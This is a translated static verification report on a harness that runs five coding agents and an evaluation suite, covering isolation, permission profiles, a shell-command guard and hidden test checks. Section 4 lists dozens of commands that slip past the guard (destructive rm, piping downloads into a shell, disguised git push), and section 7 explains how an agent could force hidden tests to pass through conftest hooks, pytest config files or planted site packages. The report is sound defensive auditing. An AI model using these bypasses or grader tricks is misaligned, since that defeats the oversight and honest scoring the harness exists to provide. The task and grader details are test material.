> Translated from the Portuguese original (commit 30666ad).

# Independent verification (static phase): E6 preparation (`agents/`) and E8 preparation (`eval/`)

- **Date:** Oct 29, 2026, from 11:55 to 12:15.
- **Subject:** `agents/` as of `2de5b31` (with `3d0efb1` and `d11901a`) and `eval/` as of `1f8e59f`.
- **Files changed during the verification:**
  - At the start, `git diff --stat` showed `eval/README.md | 28 +++-` and `eval/run.sh | 43 ++++--` (61 insertions, 10 deletions). The E7 agent was editing both.
  - During the verification, those changes went into commit `70a6d04` (the `EVAL_WRAPPER` hook).
  - I evaluated the logic of `1f8e59f`. I did not treat the `EVAL_WRAPPER` hook as a defect: it is left for the E7 verifier.
- **Method:** static verification only, because E4 was running.
  - What I did:
    - complete reading of the files;
    - `bash -n` and `py_compile`;
    - `agents/lib/test-guard.sh`;
    - 65 commands built to bypass the guard, passed directly to `guard.py`;
    - dry-run of the 5 `run.sh`, with a disposable HOME and with the real HOME;
    - `npm view` with the npm cache in a disposable folder;
    - `stat` (modification date only) of the real configurations.
  - I did not run an LLM, docker, jest, pytest, the eval's `validate.sh`, `run.sh` or `matrix.sh`.
- **My side effect, already undone:**
  - `python3 -I -m py_compile` created 7 `__pycache__` folders in the repository, because `-I` ignores `PYTHONPYCACHEPREFIX`.
  - All had a creation date between 11:57:18 and 11:57:19, so none existed before. I deleted all 7 right after.
  - Apart from this report, I changed nothing else in the repository.

## Summary

| Area | Verdict | In one line |
|---|---|---|
| `run.sh` contract (5 agents) | **PASS** | All five use the same `parse_run_args`, `env.sh` and `run_agent`. `LLM_BASE_URL` and `LLM_MODEL` are respected, even with a trailing `/v1/`. Exit = the agent's code; argument error = 2. |
| Configuration isolation | **PARTIAL** | The generated configs and the dry-run are isolated, checked on the real HOME. But `install.sh` runs `<agent> --version` with the real HOME (**blocking**). On the host, the agents inherit variables from the orchestrating Claude Code session. |
| npm versions and integrity | **PASS** | 5 of 5 `dist.integrity` hashes equal the registry. There are minor caveats about transitive dependencies and Qwen Code's `latest`. |
| Permission profiles and guard | **PARTIAL** | The profiles are consistent with each other. The guard lets common shell syntax through (`if …; then rm -rf ~; fi`, `for …; do git push; done`, heredoc to `bash`). The README promises more than it does ("`git push` in any form"). |
| Claude Code `bypassPermissions` | **PARTIAL** | Only reached by `run.sh` (or by a flag passed by hand to the launcher), always with an isolated `CLAUDE_CONFIG_DIR`. Nothing prevents running it on the host. The `claude-local` README does not say it is container-only. |
| Light checks | **PASS** | `bash -n`: 46 of 46. `py_compile`: 13 of 13. `test-guard.sh`: all cases passed. Dry-run: 5 of 5 without executing anything and without touching the real configs. |
| Tasks and prompts (T1–T7, S1–S3) | **PASS** | The prompts are realistic and do not cite the hidden tests. Hidden tests and solutions only enter the workdir during verification. |
| Hidden checks | **PARTIAL** | Good overall, with three problems. T6 requires semantics the specification does not define. T5 approves the root cause by keywords, with no mandatory review. The protection of the test configuration has gaps (`conftest.py` outside the list, `pytest.toml`, `.venv`/`node_modules`). |
| Mutants (T4, S3) | **PARTIAL** | The 18 mutants are meaningful. But any already-existing test file that the agent changes enters the count and inflates T4's score. |
| Runner, schema and aggregation | **PASS** | The logic is correct. There are minor caveats: the Goal 1 criterion ignores interventions and destructive actions, and an infrastructure error in the checks becomes `fail`. |

**1 blocking, 7 important and 9 minor** (list at the end). For the eval, no problem is blocking. The blocking one is in `agents/install.sh` and only applies to installation on the host.

---

## 1. `agents/`: `run.sh` contract: PASS

- All `run.sh` do the same thing: `set -euo pipefail`, then `source lib/common.sh`, `parse_run_args "$@"`, `source env.sh` and `run_agent <agent> -- …`.
- `parse_run_args` does the following:
  - validates the three arguments (also accepts `--x=value`);
  - resolves paths with `pwd -P`;
  - refuses an empty prompt or one of 120 KB or more;
  - appends `\n` to a prompt that starts with `-`;
  - uses `AGENT_PROFILE=autonomous` by default;
  - creates `AGENT_HOME=<log-dir>/home`.
- `run_agent` does the following:
  - writes `command.txt` with `@PROMPT@` in place of the prompt;
  - with `AGENT_DRY_RUN=1`, prints and returns 0 before any execution;
  - otherwise, runs with `cd workdir`, stdin `/dev/null` and the optional `timeout`;
  - writes `run-meta.json` and `agent-metrics.json`, the second without changing the exit code;
  - returns the agent's code.
- Exit codes: the agent's; 2 on an argument error (`die`); 124 or 137 on timeout.

Dry-run with a disposable HOME, `LLM_BASE_URL=http://127.0.0.1:9999/v1/` and `LLM_MODEL=modelo-x` (excerpt):

```
$ env -i HOME=$S/dry/home PATH=/usr/local/bin:/usr/bin:/bin AGENT_DRY_RUN=1 LLM_BASE_URL=http://127.0.0.1:9999/v1/ \
    LLM_MODEL=modelo-x OPENAI_API_KEY=sk-real-should-not-leak ANTHROPIC_API_KEY=sk-ant-should-not-leak \
    bash agents/<h>/run.sh --workdir $S/dry/work --prompt-file $S/dry/prompt.txt --log-dir $S/dry/log-<h>
qwen-code    … qwen --prompt=@PROMPT@ --output-format stream-json --approval-mode yolo                     rc=0
codex-local  … codex exec --json --color never --cd … --skip-git-repo-check --output-last-message …
               --profile autonomous --model modelo-x --dangerously-bypass-hook-trust @PROMPT@            rc=0
pi           … pi --mode json --provider local --model modelo-x --thinking medium --no-approve -e …/guard.ts @PROMPT@  rc=0
opencode     … opencode run --format json --model llamacpp/modelo-x --dir … --title eval\ 2026… --print-logs --log-level INFO --auto @PROMPT@  rc=0
claude-local … claude -p --output-format stream-json --verbose --model modelo-x --tools Bash\,Read\,Edit\,Write
               --setting-sources user --exclude-dynamic-system-prompt-sections --permission-mode bypassPermissions @PROMPT@  rc=0
```

- URL in the 5 generated files: `http://127.0.0.1:9999/v1`, with the trailing `/v1/` removed and re-added exactly once.
- The model `modelo-x` appears 9 times.
- All JSON files are valid (`jq`) and no `//` key was left over.
- Codex's TOML is valid (`tomllib`): `model_auto_compact_token_limit=98304`, `hooks.PreToolUse[0].matcher='Bash'`.
- `local.rules` has the 9 `prefix_rule` entries.
- The hook points to `python3 -I "<repo>/agents/lib/guard.py"` in the three agents that use a hook. In the container, `agents/` is mounted at the same path (`sandbox/run-in-box.sh:121`).

## 2. `agents/`: isolation: PARTIAL

### What is right

| Agent | Variable | Where it lives | Checked |
|---|---|---|---|
| Qwen Code | `QWEN_HOME` | `<log-dir>/home/qwen` | `env.sh`; also reads `~/.env` (documented; it does not exist here) |
| Codex | `CODEX_HOME` | `<log-dir>/home/codex` | `env.sh`; clears `OPENAI_API_KEY`, `CODEX_API_KEY`, `OPENAI_BASE_URL`, `OPENAI_ORG_ID`, `OPENAI_PROJECT_ID` |
| Pi | `PI_CODING_AGENT_DIR` | `<log-dir>/home/pi` | `env.sh` |
| OpenCode | `XDG_CONFIG/DATA/CACHE/STATE_HOME` | `<log-dir>/home/opencode/*` | `env.sh`; `OPENCODE_DISABLE_CLAUDE_CODE=1` and `OPENCODE_DISABLE_EXTERNAL_SKILLS=1` (does not read `~/.claude`/`~/.agents`) |
| Claude Code | `CLAUDE_CONFIG_DIR` | `<log-dir>/home/claude` | `env.sh`; clears `ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, Bedrock/Vertex/Foundry |

- No script or config cites `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode` or `~/.pi` as a read or write path. Those names only appear in comments.
- `grep` over the generated files found no real HOME paths nor the fake keys I injected (`sk-real…`, `sk-ant…`):

```
$ grep -rnE '~/(\.claude|\.codex|\.qwen|\.gemini|\.pi|\.config|\.agents)|sk-real|sk-ant' log-*   # caminhos anonimizados para publicação; no original era o caminho absoluto da HOME
(nenhuma)
```

- The disposable HOME remained empty after the 5 dry-runs (`find $S/dry/home` showed only the root).
- I repeated the dry-runs with the **real HOME** and compared the modification date of the paths that do not change by themselves:

```
antes == depois:
~/.codex 1793217734 · ~/.gemini 1793118412 · ~/.agents 1789384635
~/.qwen, ~/.config/opencode, ~/.local/share/opencode, ~/.pi, ~/.local/opt/agents: ausentes antes e depois
```

`~/.claude` and `~/.claude.json` change all the time because of the orchestrator's own session. So their date is no proof, neither here nor in E6: the proof has to come from the container or from a disposable HOME.

### What fails

- **B1: `agents/install.sh` runs each agent with the real HOME.**
  - The last line of `install_one` is `"$dest/bin/$exe" --version || true`, without a temporary `HOME` and without the isolation variables.
  - E7 itself recorded the effect in `sandbox/install-agents.sh`: *"O --version de alguns agentes cria arquivos na HOME; nada disso fica na imagem"* (in English: the `--version` of some agents creates files in HOME; none of that stays in the image). This is why the E7 script swaps `HOME` for a temporary folder.
  - On the host, the same command may create `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi` or touch `~/.codex`/`~/.claude.json`.
  - I did not run it to confirm: the binaries are not installed and the installation did not fit in this phase. Even so, it is exactly the type of leak the README says does not exist, and the fix is one line.
- **I4: orchestrator session variables pass to the agent on the host.**
  - This session's environment has `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_CODE_CHILD_SESSION`, `CLAUDE_CODE_ENABLE_TELEMETRY`, `CLAUDE_EFFORT`, `CLAUDE_CODE_ENTRYPOINT` and `CLAUDE_CODE_EXECPATH`. I only listed the names, not the values.
  - `claude-local/env.sh` clears none of them. `qwen-code/env.sh` and `pi/env.sh` do not clear `OPENAI_*` either.
  - Inside the container this does not happen, because `run-in-box.sh` only forwards variables from a list (`sandbox/run-in-box.sh:167-176`).
  - On the host it does. Examples: `measure-preamble.sh` called by the orchestrator, or a launcher opened in a terminal inside a Claude Code session. Local Claude would inherit the parent session's messaging socket and token.

## 3. `agents/`: versions and integrity: PASS

```
$ npm view --cache <descartável> <pkg>@<ver> dist.integrity      (compared with agents/versions.env)
OK @qwen-code/qwen-code@0.26.3            publicado 2026-10-28  (dist-tags.latest agora = 0.26.4)
OK @earendil-works/pi-coding-agent@1.4.0  publicado 2026-10-21  (latest = 1.4.0)
OK opencode-ai@1.19.5                     publicado 2026-10-28  (latest = 1.19.5)
OK @anthropic-ai/claude-code@2.1.308      publicado 2026-10-22  (stable = 2.1.308, latest = 2.1.312)
OK @openai/codex@0.165.0                  publicado 2026-10-27  (latest = 0.165.0)
```

- The native binaries come in optional dependencies with an exact version and no hash pinned in `versions.env`: `@openai/codex@0.165.0-linux-x64`, `@anthropic-ai/claude-code-linux-x64@2.1.308` and `opencode-linux-x64@1.19.5`. npm does not allow publishing the same version again, so the risk is small.
- Pi has 22 dependencies with exact versions, but their own dependencies may vary, because the installation does not use a lockfile (M2).
- `postinstall`: only `opencode-ai` (`node ./postinstall.mjs`) and `claude-code` (`node install.cjs`), as the README says.
- `install.sh` compares the `dist.integrity` published in the registry, without computing the hash of the downloaded file. `sandbox/install-agents.sh` computes the SHA-512 of the tarball, which is stronger (M2).

## 4. `agents/`: permission profiles and guard: PARTIAL

### Profiles

| | interactive | autonomous | Native blocks (autonomous) |
|---|---|---|---|
| Qwen Code | `default`: shell and edit ask | `--approval-mode yolo` | `deny`: git push, sudo/su/doas/pkexec, npm/pnpm/yarn/bun/pip/uv/apt/brew |
| Codex | `on-request` + `workspace-write`, no network | `never` + `danger-full-access` | `forbidden`: git push, sudo…, installers |
| Pi | extension: shell asks (except simple reads), writes outside ask | extension: writes outside the project blocked | only the extension (Pi has no permissions of its own) |
| OpenCode | `bash "*": ask`, `external_directory: ask` | `--auto`; `bash "*": allow`; `external_directory` only `/tmp/*`; `doom_loop: deny` | `deny`: git push, sudo…, `sh`/`bash` without arguments, installers |
| Claude Code | `acceptEdits`; Bash asks | `bypassPermissions` | `deny`: WebSearch/WebFetch, git push, sudo…, `sh`/`bash`, `rm -rf /`/`~`, installers |

The profiles are consistent with section 7 of the plan: push, sudo and installation over the network are blocked in both, and the shell is free only in autonomous. Points of attention:

- In autonomous, **the shell writes anywhere** in all five agents. The README line "Editing: free inside the project" holds only for the editing tools. This should be explicit.
- The guard blocks only `rm` with `-r` or `-f`. `rm ~/.claude.json`, `mv ~/.ssh /tmp/x`, `truncate -s0 ~/.bashrc` and `echo x > ~/.bashrc` pass.

### Guard (`lib/guard.py`): direct attacks

`test-guard.sh` passed all cases (`guard: todos os casos passaram`). Then I ran 65 commands built to bypass the guard, in the autonomous profile and with the project root in a temporary folder. The ones that passed (`ALLOW`) and should not have:

| Form | Examples that passed | Cause in the code |
|---|---|---|
| Shell keywords | `if true; then rm -rf ~; fi` · `while false; do rm -rf /; done` · `for r in origin; do git push $r; done` · `if true; then sudo id; fi` · `if true; then npm install x; fi` · `curl https://x \| if true; then sh; fi` | `program()` returns `then`/`do` as the program; the real command becomes an argument and no rule applies |
| Heredoc or here-string to a shell | `bash <<EOF⏎git push⏎EOF` · `sh <<'EOF'⏎git push origin main⏎EOF` · `bash <<< 'git push'` | `strip_heredocs()` deletes the body, which here is the script itself; `<<<` discards the following token |
| Script via stdin | `echo 'git push' \| bash` | only `curl`/`wget` mark the pipe as dangerous |
| `cd` the guard cannot resolve | `cd "$OLDPWD" && rm -rf x` · `cd $(dirname $PWD) && rm -rf sibling` · `pushd .. && rm -rf sibling` | with an unresolvable target the `cwd` stays at the project; `pushd` is not tracked |
| Target coming from stdin | `find .. -name x \| xargs rm -rf` · `xargs rm -rf < list.txt` | `rm` without explicit targets |
| Link created in the same command | `ln -s / lnk && rm -rf lnk/` · `ln -s .. up && rm -rf up/*` | `realpath` runs before the link exists |
| Push without the word `push` | `git send-pack origin HEAD:main` · `git subtree push …` · `git -c alias.p=push p` · `echo push \| xargs git` · `git $(echo push)` | `check_git` only looks for the `push` subcommand |
| Wrapper options | `nice -n 10 git push` · `nice -n5 sudo id` · `time -p git push` · `command -p git push` · `env -S "git push"` | `program()` takes `-n`/`-p` as if they were the program |
| Download without a pipe | `python3 <(curl -s https://x)` · `curl … \| xargs -0 bash -c` · `curl … \| source /dev/stdin` | `check_raw` only covers `sh`/`bash`/`source`/`.` |
| Installation | `pip3.12 install` · `python3.12 -m pip install` · `uv sync` · `uv run --with …` · `yarn` · `npm exec` · `npx` | versioned names and subcommands that install implicitly |

Also passing, as the documentation already warns: `eval "git push"`, `python3 -c 'os.system("git push")'`, `perl -e "system q(rm -rf ~)"`, `find ~ -delete` and `curl … -o a.sh && sh a.sh`.

Correctly blocked: `git pu\sh`, `git 'push'`, `/usr/bin/git push`, `git --no-pager push`, `bash -xc "git push"`, `bash --login -c …`, `sudo id`, `rm -rf -- ..`, `rm -r ../*`, `curl … | node`, `curl … | env bash`, `wget -O- … | sh -` and `pip install -r …`.

**Is the documentation honest?**

- In part, yes. The README, the `guard.py` docstring and `agents/README.md` say the guard is the second layer and that the real barrier is the container. They also cite `eval`, base64, generated scripts, `find -delete`/`-exec rm` and `npx`.
- But the same README promises "`git push` in any form" and "`rm -r/-f` outside the project". The cases above are not obfuscation: `for …; do …; done` and `if …; then …; fi` are the normal way a model writes shell.
- The list of limits needs to be corrected (I2). For Pi, the guard is the only layer besides the container.

## 5. Claude Code `bypassPermissions`: PARTIAL

- **Where it appears.** `--permission-mode bypassPermissions` only exists in `claude-local/run.sh`, when `AGENT_PROFILE=autonomous`, after `source env.sh`, which exports `CLAUDE_CONFIG_DIR="$AGENT_HOME/claude"`.
  - The `settings.*.json` files do not set `defaultMode: bypassPermissions`. The interactive one uses `acceptEdits`.
  - The `claude-local` launcher forwards `"$@"`. Whoever types `--dangerously-skip-permissions` enters bypass, but still with the isolated directory.
  - There is no path to bypass that uses `~/.claude`. **PASS** on this point.
- **"It must run in the E7 container".**
  - Neither `agents/README.md` nor `agents/claude-local/README.md` say so. What they say is that "the container is the real barrier".
  - Who says it are `eval/README.md` ("always run through the container", added by E7), `sandbox/README.md` and section 8 of the plan.
  - `agents/codex-local/README.md` still says "Outside the container (E6, in WSL) … `CODEX_LOCAL_SANDBOX=workspace-write`". This became outdated after E7 started running before E6.
  - No code prevents autonomous mode on the host. `agents/measure-preamble.sh` calls `run.sh` directly, and `agents/README.md` tells people to run it that way (I3).
- `--setting-sources user` makes the eval ignore the hooks and permissions of the repository under test. The interactive launcher does not use this option, on purpose: in daily use the project belongs to the user.

## 6. `eval/`: tasks and prompts: PASS

| Task | Prompt | Check | Note |
|---|---|---|---|
| T1 | Realistic request; does not cite the answer key | `codigo_inalterado` (src, test), ≥ 300 words, 10-fact answer key (manual grade) | Specific and verifiable answer key |
| T2 | User report with reproduction | 6 hidden tests (original + branches, dialects, UPDATE, `immutable=False`) + suite | Does not depend on the shape of the fix; the request for "a test" is not checked (M7) |
| T3 | Complete specification | 25 pt/en pairs + strict + sentence + negatives | Compares with English, not with the solution: good |
| T4 | Asks for tests of `duration.ts` in a defined file | unchanged module + 12 mutants ≥ 60% + suite | See section 7 |
| T5 | Realistic symptom; names the failing tests | hidden (repeatability, strict×casual, several references) + suite + report | Good trap: making `addDuration` immutable breaks another test. Root cause by keywords (I6) |
| T6 | Detailed specification + plan | 21 hidden tests + plan (manual grade) | One test requires something the specification does not say (I5) |
| T7 | Review of the uncommitted diff | 10 hidden tests (regression + feature) + suite | "Including in code that already existed" is a light hint, acceptable in a review request |
| S1–S3 | Short and realistic | hidden/suite; S3 with 6 mutants | S2 checks the removal of the copies by the code text, which is acceptable |

- **Outside the workdir.**
  - `hidden/*` is copied only during verification and removed right after, in a `finally`.
  - If the agent created a file with the same name, it is saved as `.agent-orig` and returned at the end.
  - The solutions only enter through `validate.sh` and the `fake-oracle`.
  - The workdir is a single commit without the upstream history. The upstream's `AGENTS.md`/`CLAUDE.md` are deleted.
  - There is no `AGENTS.md`/`CLAUDE.md`/`QWEN.md` in `~`, `~/.cache`, `~/.cache/local-agentic` or `/`. I checked existence only.
- **Caveat.** Without `EVAL_WRAPPER`, the agent can read `eval/tasks/*/hidden` and the `solution.patch` files on disk. It can also read the workdirs of earlier runs, including other agents': with `EVAL_CLEANUP=deps`, the sources stay in `~/.cache/local-agentic/eval-work/<run>/<h>/<task>/repo`. The README warns about it and E7 solves it.
- **Editing or deleting tests does not help.**
  - `baseline_tests` restores the tests the agent changed before running the suite.
  - `restore_protected_config` restores or deletes the configuration listed in `repo.json`.
  - The `baseline` comes from `run.sh` (`--baseline`), not from the agent's repository.

## 7. `eval/`: checks and mutants: PARTIAL

- **Mutants.**
  - T4: 12 one-line changes, each with an observable effect: year/ms abbreviation, quarter factor, fractions, hour sign, one-minute offset, `reverseDuration` that does not reverse, month as 30 days, `round`→`floor`.
  - S3: 6 mutants: `all`→`any`, `None`→`False`, quote escape, default quotes, swapped `AS`, `alias_quote_char` precedence.
  - None is equivalent to the original code.
  - According to the README and the `e2e-oracle` result, the reference solution kills 12 of 12 and 6 of 6.
- **Inflation of the mutation score (I7).**
  - `check_mutation` counts **any** new or changed test file as "the agent's tests".
  - In chrono, `test/en/en_time_units_ago.test.ts`, `…_later` and `…_within` (36, 36 and 47 `testSingleCase`) go through `addDuration`/`reverseDuration`.
  - An agent that touches one of them, even in passing, gets those tests counted as killed mutants without writing good tests for `duration.ts`.
  - The `exclude_tests` field exists, but is not used.
- **T5 is approved by keywords (I6).**
  - The groups are `["parsedDurationCache","cache","memo"]` and `["addDuration","muta",…,"shared"]`.
  - "muta" matches "imutável" (immutable) and "cache" is generic. A report saying "cache problem in shared state" passes.
  - The `status` comes out `pass` automatically. The README says that "task.json marks the task for manual review", but the mark is just text in `notes`: no code reads that field, and `summarize.py` does not list T5 as pending.
  - The plan's criterion ("correct root cause in the report") is not actually verified.
- **T6 requires something outside the specification (I5).**
  - `test_columns_branches_are_independent` expects `columns("a")` followed by `.columns("b")` → `("a","b")`, that is, that the calls accumulate.
  - `task.md` only says that "`.columns("a", "b")` sets the list of columns". An implementation that replaces the list is valid by the specification and fails the test.
  - The test mixes immutability with accumulation.
- **Unprotected test configuration (I1).** The pypika `protected_config` list covers `pyproject.toml`, `setup.cfg`, `pytest.ini`, `tox.ini`, `conftest.py` and `pypika/tests/conftest.py`. Left out:
  - `pypika/conftest.py` and any other `conftest.py` in the path of the hidden tests (`pypika/tests/test_hidden_*.py`). A `pytest_runtest_makereport` hook there forces "passed".
  - `pytest.toml`, `.pytest.toml` and `.pytest.ini`. The pinned pytest is 9.2.0, and `_pytest/config/findpaths.py` in the cached wheel confirms: `CONFIG_LOADERS_BY_NAME = {"pytest.toml", ".pytest.toml", "pytest.ini", ".pytest.ini", "pyproject.toml", "tox.ini", "setup.cfg"}`, in that precedence order. An `addopts = "-p <plugin from the repo>"` gets in.
  - `.venv/` and `node_modules/`, which are in `.git/info/exclude`. The agent can alter pytest, jest or ts-jest, or plant a `.pth`/`sitecustomize`. Nothing is reinstalled or checked before the checks.
  - In chrono, a new `jest.config.cjs`/`.json` would only break jest (conflict with the `"jest"` entry in `package.json`). ts-jest does not use babel. The risk there is smaller.
  - The plan records, in the harness-bench, cases of an agent that read the grader. So the hardening is worthwhile, although `agent.patch` shows any new file.

## 8. `eval/`: runner, schema and aggregation: PASS

I read `run.sh` (at `1f8e59f`), `matrix.sh`, `validate.sh`, `summarize.py`, `grade.py`, `lib/common.sh`, `lib/check.py`, `lib/result.py`, `lib/metrics.py`, `lib/sampler.py` and `harnesses/fake-oracle/run.sh`.

- **Correct:**
  - `run-id` and `harness` validated by regex.
  - Lock with `flock`.
  - Setup from scratch, with a base commit of fixed hash.
  - `start_ref` via `git stash create`, which includes T7's pending diff.
  - `agent.patch` with new files, through a temporary index, before the checks.
  - Explicit `--baseline`.
  - `timeout -k 30`, with 124 and 137 recorded as `timed_out`.
  - Server metrics with detection of a reset counter.
  - `result.json` with the documented schema. `grade.py` only approves if `auto_checks_pass` is true.
- **Checked without running:** the existing `result.json` files in `eval/runs/e2e-oracle` and `e2e-negative` match the README. There are 10 runs:
  - 8 `pass` and 2 awaiting a grade, which became `pass` after `grade.py`;
  - `noop` gave `fail`;
  - `timeout` gave `timed_out: true` and `fail`.
- **Minor:**
  - `summarize.py`'s Goal 1 table does not discount `interventions` and does not measure "no destructive action", two criteria of the plan (M5).
  - Runs with `error` enter the denominator of the 2/3, but not the success rate (M5).
  - An exception in a mandatory check becomes `pass: False` with `infra_error`, and therefore `status: fail`. `check.py`'s `return 2` is never reached, and `result.py` does not use `infra_errors`. An infrastructure error is counted as an agent failure (M6).

---

## Problems

| # | Severity | Problem | Suggested fix |
|---|---|---|---|
| B1 | **blocking** | `agents/install.sh` runs `<agent> --version` with the real HOME and without the isolation variables. It can create or change `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.pi`, `~/.codex` and `~/.claude.json`. E7 already recorded that `--version` writes to HOME. | Run with `HOME="$(mktemp -d)"` and clean `XDG_*`, as `sandbox/install-agents.sh` does, or read the version from the installed `package.json`. |
| I1 | important | The test-configuration protection has gaps: `conftest.py` outside the list, `pytest.toml`/`.pytest.toml`/`.pytest.ini` (read by pytest 9.2), `.venv`/`node_modules` alterable. An agent can force the hidden tests to pass. | In `protected_config`, accept patterns (`**/conftest.py`, `pytest.toml`, `.pytest.toml`, `.pytest.ini`, `jest.config.*`). Before the checks, recreate `.venv`/`node_modules` from the cache, without network, or run with clean copies. |
| I2 | important | The guard lets common syntax through: `if/then`, `for/do`, heredoc or here-string to `bash`, `cd "$VAR"`/`pushd`, `xargs rm -rf`, `send-pack`/`subtree push`/alias, options of `nice`/`time`/`command`/`env -S`. The README promises "`git push` in any form". | Treat shell keywords (`if then elif else fi for while until do done case esac { } !`) as separators. Evaluate the body of a heredoc or here-string when the reader is a shell or interpreter. With an unknown `cwd`, deny relative `rm -r/-f`. Deny `rm -r/-f` coming from `xargs`/`find -exec`. Cover `send-pack`, `subtree push` and `-c alias.*`. Handle options with arguments in wrappers. Update the list of limits in the README. |
| I3 | important | Nothing prevents autonomous mode on the host (Claude in bypass, Qwen in yolo, Pi without permissions, Codex in `danger-full-access`). `measure-preamble.sh` calls `run.sh` directly. The READMEs of `agents/` and `claude-local/` do not say "container only", and the Codex one still talks about "E6 in WSL". | In `run.sh`, refuse `AGENT_PROFILE=autonomous` outside the container, unless `AGENT_ALLOW_HOST=1`. The container can set `AGENT_BOX=1`, or the script can check `/.dockerenv`. Update the three READMEs and the use of `measure-preamble.sh`. |
| I4 | important | On the host, the agent inherits variables from the parent session: `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET/TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_EFFORT`… and `OPENAI_*` in Qwen and Pi. | In `run_agent` and in the launchers, run with `env -i` and an allowlist of variables, as `run-in-box.sh` does. At minimum, clear `CLAUDECODE` and any `CLAUDE_CODE_*`/`CLAUDE_*` not set on purpose, and `OPENAI_*` in Qwen and Pi. |
| I5 | important | The hidden test `test_columns_branches_are_independent` (T6) requires `.columns()` to accumulate between calls, which is not in the specification. A valid solution fails. | Rewrite the test so it does not depend on accumulating or replacing (branches from a base without columns), or specify in `task.md` that the calls accumulate, as in `create_table`. |
| I6 | important | T5's root cause is approved by broad keywords ("cache", "muta" matches "imutável") and the result becomes `pass` without review. The plan's criterion is not verified. | Make the report a graded item (`pending_grading`) or add `needs_review: true`, which `summarize.py` lists. Require specific terms at the same time (`parseDuration`/`parsedDurationCache` **and** `addDuration`). |
| I7 | important | Mutation (T4, S3): any already-existing test file that the agent changes enters the count. In T4, the English time-unit tests already exercise `duration.ts` and inflate the score. | Count only files that do not exist in the baseline (or the path requested in the prompt). Another option: discount the mutants that the baseline version of those files already kills. |
| M1 | minor | Qwen Code's `latest` became 0.26.4. The README says 0.26.3 is the `latest`. | Update the text. The pinned version remains valid. |
| M2 | minor | `install.sh` checks the integrity published in the registry, not the hash of the downloaded file, and does not use a lockfile (transitive dependencies vary). | Reuse the method from `sandbox/install-agents.sh` (`npm pack` + SHA-512 of the file). Optional: `npm-shrinkwrap` per agent. |
| M3 | minor | The agent can change its own config in `<log-dir>/home` (hooks, `deny`) and `guard.log` during the run. The second layer and the `guard_blocks` metric can be turned off or tampered with. | Generate the config in a read-only folder in the container, or check the hash of the config and of `guard.log` after the run. |
| M4 | minor | In Pi's extension, `write`/`edit` use `path.resolve` without `realpath`: a link inside the project that points outside passes. | Use `fs.realpathSync` on the target's parent directory. |
| M5 | minor | `summarize.py`'s Goal 1 ignores `interventions` and destructive actions. `error` enters the 2/3 but not the rate. | Count as success only `pass` with `interventions == 0`. Show the median of interventions and the guard blocks. Treat `error` separately. |
| M6 | minor | An infrastructure error in the checks becomes an agent `fail`. | Propagate `infra_errors` to `status: error` in `result.py`, or separate an infrastructure exception from a test failure. |
| M7 | minor | T2/S1 ask for "a test" and T6 asks for documentation in the README, but none of that is checked. | Add a non-mandatory check (new or changed test file, changed README) to record it. |
| M8 | minor | `tool_call_errors` is not comparable between agents: in Codex, a command with an exit code other than 0 counts as an error. | In the E6 table, show the column per agent with the definition, or normalize. |
| M9 | minor | `agents/README.md` "Editing: free inside the project" holds only for the editing tools: in autonomous the shell writes anywhere, and plain `rm`, `mv`, `truncate` and `>` outside the project pass through the guard. | Say this explicitly in the permissions table. |

## Can only be verified at runtime (after E4)

1. **Real isolation.** Install with B1 fixed. Then run each agent once, preferably in the container or with a disposable HOME on the host. Check that nothing was created or changed in `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi`, `~/.agents` and `~/.cache/claude-cli-nodejs`. Use `find -newer <marker>`. The date of `~/.claude` is no use, because the orchestrator's session touches it.
2. **Skills folders outside the isolated config.** See whether Codex, Pi or Qwen read `~/.agents/skills` (it exists on this machine) even with `CODEX_HOME`/`PI_CODING_AGENT_DIR`/`QWEN_HOME`. This affects the interactive launchers on the host.
3. **Config accepted by the pinned version.**
   - Qwen: `$version: 4`, `goals`, `tools.disabled`, `hooks` with `name`.
   - Codex: `--profile autonomous` read from `$CODEX_HOME/autonomous.config.toml`. If it is not read, the eval runs with another approval or sandbox.
   - Pi: `apiKey: "$LOCAL_LLM_API_KEY"` resolved and `-e guard.ts` loaded in `--mode json`.
   - OpenCode: the `--auto` flag exists in 1.19.5, and the plugin loads without downloading `@opencode-ai/plugin` (no network in the container).
   - Claude: `--exclude-dynamic-system-prompt-sections` and `--setting-sources user`.
4. **The guard fires in each agent.**
   - Ask for `git push` and `rm -rf ../x` and check in `guard.log`.
   - Codex: `tool_input.command` arrives as a **string**. If it comes as a list, `guard.py` does `str(list)` and lets everything through.
   - Qwen: the hook runs in YOLO.
   - Claude: `deny` + hook hold in bypass, as a non-root user in the container.
   - Repeat the cases from section 4 after the I2 fix.
5. **Nested local Claude.** With `CLAUDECODE` inherited on the host, see whether `claude -p` refuses or attaches to the parent session. In the container, check that the variable does not arrive.
6. **Endpoints.**
   - `/v1/messages`: thinking, temperature coming from `CLAUDE_CODE_EXTRA_BODY`, `count_tokens`.
   - `/v1/responses`: `reasoning` items with `content`, `apply_patch` through the shell.
   - Sampling reaching the server, checked with `--verbose`.
   - Number of requests per turn.
7. **`agent-metrics.json` against `events.jsonl`.** In particular, see whether Claude Code repeats blocks between `assistant` events of the same message: that would count calls twice and flag false loops.
8. **First real eval run through `EVAL_WRAPPER`.**
   - Run S1–S3 with 1 agent.
   - Confirm that `hidden/` and `solution.patch` are not visible in the container.
   - Measure the time of the checks and check the `TZ`.
   - See whether the agent can rewrite its own config in `<log-dir>/home` (M3).
9. **Answer keys.** T1 and T6 with a human grader, and T5 checked by hand until I6 is fixed.
